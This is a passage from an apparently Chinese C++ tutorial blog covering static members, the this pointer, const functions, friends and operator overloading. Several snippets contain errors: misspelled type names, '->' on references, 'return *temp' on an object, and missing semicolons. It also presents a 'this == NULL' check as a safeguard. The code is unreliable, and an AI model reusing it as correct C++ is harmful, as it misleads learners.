class="hljs-keyword">int</span> b,<span class="hljs-keyword">int</span> c):<span class="hljs-built_in">ma</span>(a),<span class="hljs-built_in">mb</span>(b),<span class="hljs-built_in">mc</span>(c)&#123;<br><span class="hljs-comment">// XXX</span><br>    &#125;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-keyword">int</span> ma,mb,mc;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="类对象作为类成员">类对象作为类成员</h4><p><code>C++</code>类中的成员可以是另一个类的对象，我们称该成员为对象成员</p><p>如：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> &#123;</span>&#125;;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> &#123;</span><br>A a;<br>&#125;;<br></code></pre></td></tr></table></figure><p>可以简单的理解为结构体的嵌套，一个类中包括另一个类也是相似的</p><p>需要注意的是当其他类的对象作为类成员时，会先调用类成员，再构造自身，以上面的例子来说，先会执行<code>A</code>的构造函数，随后执行<code>B</code>的构造函数。而执行析构时则先执行<code>B</code>，随后再执行<code>A</code></p><h4 id="静态成员">静态成员</h4><p>静态成员就算在成员变量和成员函数前加上static</p><p>静态成员变量：</p><ul><li><p>所有对象共享同一份数据</p><blockquote><p>当存在有另一个类名相同的类对类中一个静态成员进行修改时，那么原先类中的值将会发生改变</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">P</span>&#123;</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> a;<br>&#125;<br><span class="hljs-keyword">int</span> P::a = <span class="hljs-number">100</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span>&#123;<br>P p0,p1;<br>p1.a = <span class="hljs-number">200</span>;<br>cout&lt;&lt;p0.a; <span class="hljs-comment">// 200</span><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-built_in">test</span>();<br>&#125;;<br></code></pre></td></tr></table></figure><p>于此同时我们可以通过对象或者类名来进行访问对应的内存(静态成员变量)</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 对象</span><br>P p;<br>cout &lt;&lt; p.a &lt;&lt; endl;<br><span class="hljs-comment">// 类名</span><br>cout &lt;&lt; P::a &lt;&lt; endl;<br></code></pre></td></tr></table></figure></blockquote></li><li><p>在编译阶段分配内存</p></li><li><p>类内声明，类外初始化</p><blockquote><p>假如我们定义了一个类</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">P</span>&#123;</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> a; <span class="hljs-comment">//类内声明</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>那么我们还需要在类外进行初始化</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">int</span> P::a = <span class="hljs-number">100</span>;<br></code></pre></td></tr></table></figure><p>那么结合起来整个定义过程为：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">P</span>&#123;</span><br><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> a; <span class="hljs-comment">//类内声明</span><br>&#125;;<br><span class="hljs-keyword">int</span> P::a = <span class="hljs-number">100</span>;<br></code></pre></td></tr></table></figure></blockquote></li></ul><p>静态成员函数：</p><ul><li><p>所有对象共享同一个函数</p></li><li><p>静态成员函数只能访问静态成员变量</p><blockquote><p>举个例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">P</span>&#123;</span><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span></span>&#123;<br>a = <span class="hljs-number">100</span>; <span class="hljs-comment">// 可以进行操作</span><br>b = <span class="hljs-number">100</span>; <span class="hljs-comment">// 非法操作 </span><br>&#125;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> a = <span class="hljs-number">100</span>;<br><span class="hljs-keyword">int</span> b;<br>&#125;;<br><span class="hljs-keyword">int</span> P::a = <span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><p><code>a</code>作为静态成员时可以被其访问到，而<code>b</code>作为一个普通变量无法被访问到</p></blockquote></li></ul><h3 id="C-对象模型和this指针">C++ 对象模型和this指针</h3><h4 id="成员变量和成员函数分开存储">成员变量和成员函数分开存储</h4><p><code>C++</code>中，类内成员变量和成员函数分开存储，只有非静态成员变量才属于类的对象上</p><p>空对象占用内存空间为 <code>1</code>，因为<code>C++</code>编译器会给每一个空对象也分配一个字节空间，是为了区分空对象占内存的位置</p><blockquote><p>不为空时，类的大小就算类内成员所占空间的大小</p><p>需要注意的是，仅有非静态成员变量属于类的对象上，像静态成员变量、非静态成员函数、静态成员函数都不属于类对象上</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">P</span>&#123;</span><br><span class="hljs-keyword">int</span> a;<br><span class="hljs-keyword">static</span> <span class="hljs-keyword">int</span> b;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">func1</span><span class="hljs-params">()</span></span>&#123;&#125;<br>    <span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-title">func2</span><span class="hljs-params">()</span></span>&#123;&#125;<br>&#125;;<br></code></pre></td></tr></table></figure><p>此时<code>P</code>类的大小还是只计算一个<code>int a</code>的大小，即为 4</p></blockquote><h4 id="this指针">this指针</h4><p><code>C++</code>中成员变量和成员函数是分开存储的，每一个非静态成员函数只会诞生一份函数实例，也就是说多个同类型的对象会共用一块代码</p><p><code>C++</code>通过<code>this</code>指针指向被调用的成员函数所属的对象</p><p><code>this</code>指针式隐含每一个非静态成员函数内的一种指针，<code>this</code>指针不需要定义，直接使用即可</p><p><code>this</code>指针用途：</p><ul><li><p>当形参与成员变量同名时，可以用<code>this</code>指针来区分</p><blockquote><p>举个例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">Person</span>(<span class="hljs-keyword">int</span> age)&#123;<br>age = age;<br>    &#125;<br>    <span class="hljs-keyword">int</span> age;<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-function">Person <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">18</span>)</span></span><br><span class="hljs-function">cout&lt;&lt;p1.age</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们可以发现程序的输出并不是<code>18</code>，而是一个随机的值，为了解决中国问题我们可以使用<code>this</code>指针来指向被调用的成员函数所属的对象</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">Person</span>(<span class="hljs-keyword">int</span> age)&#123;<br><span class="hljs-keyword">this</span> -&gt; age = age;<br>    &#125;<br>    <span class="hljs-keyword">int</span> age;<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-function">Person <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">18</span>)</span></span><br><span class="hljs-function">cout&lt;&lt;p1.age</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>也就是<code>this</code>指向本类中的<code>age</code>变量来避免了重名的问题</p></blockquote></li><li><p>在类的非静态成员函数中返回对象本身，可使用<code>return *this</code></p><blockquote><p>举个例子：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">Person</span>(<span class="hljs-keyword">int</span> age)&#123;<br><span class="hljs-keyword">this</span> -&gt; age = age;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">PersonAgeAdd</span><span class="hljs-params">(Person &amp;p)</span></span>&#123;<br><span class="hljs-keyword">this</span> -&gt; age += p.age;<br>&#125;<br>    <span class="hljs-keyword">int</span> age;<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-function">Person <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">18</span>)</span></span><br><span class="hljs-function">    Person <span class="hljs-title">p2</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span></span><br><span class="hljs-function">    p1.<span class="hljs-title">PersonAgeAdd</span><span class="hljs-params">(p2)</span></span><br><span class="hljs-function">cout&lt;&lt;p1.age</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>上面代码是我们一般实现一个年纪加法的一种运算，对此我们如果想要再次实现一个加法需要再加一行，再加上一行的<code>p1.PersonAgeAdd(p2)</code></p><p>但是<code>C++</code>提供的<code>this</code>指针，可以给我们创建点便利，像<code>Python</code>代码一样使用多个<code>.</code>来进行链接，达到<code>p1.PersonAgeAdd(p2).PersonAgeAdd(p2)</code>的效果</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">Person</span>(<span class="hljs-keyword">int</span> age)&#123;<br><span class="hljs-keyword">this</span> -&gt; age = age;<br>    &#125;<br>    <span class="hljs-function">Person&amp; <span class="hljs-title">PersonAgeAdd</span><span class="hljs-params">(Person &amp;p)</span></span>&#123; <span class="hljs-comment">// 需要使用引用的方式来进行返回</span><br><span class="hljs-keyword">this</span> -&gt; age += p.age;<br>        <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>; <span class="hljs-comment">// 返回的是Person本身这个实体</span><br>&#125;<br>    <span class="hljs-keyword">int</span> age;<br>&#125;;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    <span class="hljs-function">Person <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">18</span>)</span></span><br><span class="hljs-function">    Person <span class="hljs-title">p2</span><span class="hljs-params">(<span class="hljs-number">10</span>)</span>      </span><br><span class="hljs-function">    p1.<span class="hljs-title">PersonAgeAdd</span><span class="hljs-params">(p2)</span>.<span class="hljs-title">PersonAgeAdd</span><span class="hljs-params">(p2)</span></span><br><span class="hljs-function">cout&lt;&lt;p1.age</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>需要注意的是，我们如果将其不小心写成了一个值的返回</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">Person <span class="hljs-title">PersonAgeAdd</span><span class="hljs-params">(Person &amp;p)</span></span>&#123; <span class="hljs-comment">// 引用的方式来进行返回被我们更改为一个值的类型</span><br><span class="hljs-keyword">this</span> -&gt; age += p.age;<br>        <span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>; <span class="hljs-comment">// 返回的是不再是Person本身这个实体，而是创建了一个新的Person实体，可以理解为Person’</span><br>&#125;<br></code></pre></td></tr></table></figure><p>我们如果是上面的写法的话，那我们得到的永远是Person的一个新实例，而不是原先的对象本身，导致我们想获取到的数据发生问题</p></blockquote></li></ul><h4 id="空指针访问成员函数">空指针访问成员函数</h4><p><code>C++</code>空指针也是可以调用成员函数的，但是也要注意到有没有用到<code>this</code>指针</p><p>如果用到了<code>this</code>指针，需要加以判断保证代码健壮性</p><p>空指针可以访问对应的对象，但是不能访问对象中的变量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">test1</span><span class="hljs-params">()</span></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;test1&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">test2</span><span class="hljs-params">()</span></span>&#123;<br>cout &lt;&lt; age &lt;&lt;endl;<br><span class="hljs-comment">// 此处的 age 等价于 this -&gt; age</span><br>&#125;<br><span class="hljs-keyword">int</span> age;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    Person* P = <span class="hljs-literal">NULL</span>;<br>    P -&gt; <span class="hljs-built_in">test1</span>(); <span class="hljs-comment">// 不会产生报错</span><br>    p -&gt; <span class="hljs-built_in">test2</span>(); <span class="hljs-comment">// 编译不报错，运行报错</span><br>&#125;<br></code></pre></td></tr></table></figure><p>上面例子中，因为我们没有对<code>this</code>指针进行判断，当我们新创建的一个<code>P</code>指针指向对应<code>age</code>变量时，引发了读取访问权限异常</p><p>对此我们可以加入一个判断，来确保<code>this</code>指针非空</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">test1</span><span class="hljs-params">()</span></span>&#123;<br>cout &lt;&lt; <span class="hljs-string">&quot;test1&quot;</span> &lt;&lt; endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">test2</span><span class="hljs-params">()</span></span>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">this</span> == <span class="hljs-literal">NULL</span>)&#123;<br><span class="hljs-keyword">return</span>;<br>&#125;<br>cout &lt;&lt; age &lt;&lt;endl;<br><span class="hljs-comment">// 此处的 age 等价于 this -&gt; age</span><br>&#125;<br><span class="hljs-keyword">int</span> age;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="const修饰成员函数">const修饰成员函数</h4><p><strong>常函数</strong></p><ul><li><p>成员函数后加<code>const</code>后，我们称这个函数为常函数</p><blockquote><p>成员函数后面加<code>const</code>，修改的是<code>this</code>指向，让指针指向的值也不可以修改</p></blockquote></li><li><p>常函数内不可以修改成员属性</p></li><li><p>成员属性声明时加关键字<code>mutable</code>后，常函数中依然可以修改</p><blockquote><p>假如我们有一个类</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>&#123;</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> </span>&#123;<br><span class="hljs-keyword">this</span>-&gt;age = <span class="hljs-number">20</span>; <br>&#125;<br><span class="hljs-keyword">int</span> age;<br>&#125;;<br></code></pre></td></tr></table></figure><p>可以看到<code>this-&gt;age = 20;</code>处会发生问题，显示无法修改，假如我们要实现修改什么班呢，我们可以加上mutable</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>&#123;</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span> <span class="hljs-keyword">const</span> </span>&#123;<br><span class="hljs-keyword">this</span>-&gt;age = <span class="hljs-number">20</span>; <br>&#125;<br><span class="hljs-keyword">mutable</span> <span class="hljs-keyword">int</span> age;<br>&#125;;<br></code></pre></td></tr></table></figure><p>此时我们便可以进行对应的修改</p></blockquote></li></ul><p><strong>常对象</strong></p><ul><li>声明对象前加<code>const</code>称该对象为常对象</li><li>常对象只能调用常函数</li></ul><h3 id="友元">友元</h3><p>友元的目的就是让一个函数或者类，访问另一个类中的私有函数</p><p>关键字：<code>friend</code></p><p>友元的实现</p><ul><li>全局函数做友元</li><li>类做友元</li><li>成员函数做友元</li></ul><h4 id="全局函数做友元">全局函数做友元</h4><p>我们创建一个全局函数，之后将其在类中进行声明加上<code>friend</code>即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>&#123;</span><br><span class="hljs-function"><span class="hljs-keyword">friend</span> <span class="hljs-keyword">void</span> <span class="hljs-title">F</span><span class="hljs-params">(Peroson &amp;p)</span></span>;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Person</span>()&#123;<br>age = <span class="hljs-number">18</span>;<br>&#125;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-keyword">int</span> age;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">F</span><span class="hljs-params">(Peroson &amp;p)</span></span>&#123;<br>cout&lt;&lt; p-&gt;age &lt;&lt;endl;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;<br>    Person p;<br>    <span class="hljs-built_in">F</span>(p);<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="类做友元">类做友元</h4><p>与全局函数做友元一样，我们同样创建一个类之后，在目的类中加上一个<code>friend</code>声明即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">F</span>&#123;</span><br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">(Peroson &amp;p)</span></span>&#123;<br>cout &lt;&lt; p -&gt; age &lt;&lt;endl;<br>    &#125;<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>&#123;</span><br><span class="hljs-keyword">friend</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">F</span>;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Person</span>()&#123;<br>age = <span class="hljs-number">18</span>;<br>&#125;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-keyword">int</span> age;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="成员函数做友元">成员函数做友元</h4><p>和前面的方式一样，我们在对应的类中加上对应的作用域以及<code>friend</code>即可</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">F</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span></span>&#123;&#125;;<br><span class="hljs-keyword">private</span>:<br>Person* p;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>&#123;</span><br><span class="hljs-keyword">friend</span> <span class="hljs-keyword">void</span> F::test;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Person</span>()&#123;<br>age = <span class="hljs-number">18</span>;<br>&#125;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-keyword">int</span> age;<br>&#125;;<br></code></pre></td></tr></table></figure><h3 id="运算符重载">运算符重载</h3><p>对已有的运算符重新进行定义，赋予另一种功能以适应不同的需要</p><p>关键字：<code>operator</code></p><p>我们可以通过<code>operator</code>来完成一种类型的变量和另一种类型的变量相互运算</p><h4 id="加法运算重载">加法运算重载</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-built_in">Person</span>()&#123;&#125;<br>    <span class="hljs-built_in">Person</span>(<span class="hljs-keyword">int</span> a)&#123;<br>        <span class="hljs-keyword">this</span>-&gt;age = a;<br>    &#125;<br>Person <span class="hljs-keyword">operator</span> + (Person &amp;p)&#123;<br>        Person temp;<br>temp.age = <span class="hljs-keyword">this</span>-&gt;age + p.age;<br><span class="hljs-keyword">return</span> temp;<br>&#125;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-keyword">int</span> age;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="左移运算重载">左移运算重载</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">Person</span>()&#123;&#125;<br><span class="hljs-built_in">Person</span>(<span class="hljs-keyword">int</span> a)&#123;<br>        <span class="hljs-keyword">this</span>-&gt;age = a;<br>    &#125;<br><span class="hljs-keyword">public</span>:<br><span class="hljs-keyword">int</span> age;<br>&#125;;<br><br>ostream &amp; <span class="hljs-keyword">operator</span> &lt;&lt;(ostream &amp;cout,Person &amp;p)&#123;<br>cout&lt;&lt;p.age;<br><span class="hljs-keyword">return</span> cout;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="递增运算符重载">递增运算符重载</h4><h5 id="重载前置-运算符">重载前置++运算符</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyInteger</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">MyInteger</span>()&#123;<br>num = <span class="hljs-number">0</span>;<br>&#125;<br>MyInteger &amp; <span class="hljs-keyword">operator</span> ++ ()&#123;<br>num++;<br><span class="hljs-keyword">return</span> *<span class="hljs-keyword">this</span>;<br>&#125;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-keyword">int</span> num;<br>&#125;;<br><br></code></pre></td></tr></table></figure><p>前置<code>++</code>时，<code>++</code>在前，先完成的是自增运算，随后进行赋值，因此我们输出的结果是自增后的值</p><h5 id="重载后置-运算符">重载后置++运算符</h5><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MyInteger</span>&#123;</span><br><span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">MyInteger</span>()&#123;<br>num = <span class="hljs-number">0</span>;<br>&#125;<br>MyInteger <span class="hljs-keyword">operator</span> ++ (<span class="hljs-keyword">int</span>)&#123; <span class="hljs-comment">// int 代表占位参数</span><br>        <span class="hljs-comment">// 需要先记录当时结果，后递增最后将记录做返回</span><br>        MyInteger temp = *<span class="hljs-keyword">this</span>;<br>num++;<br><span class="hljs-keyword">return</span> *temp;<br>&#125;<br><span class="hljs-keyword">private</span>:<br><span class="hljs-keyword">int</span> 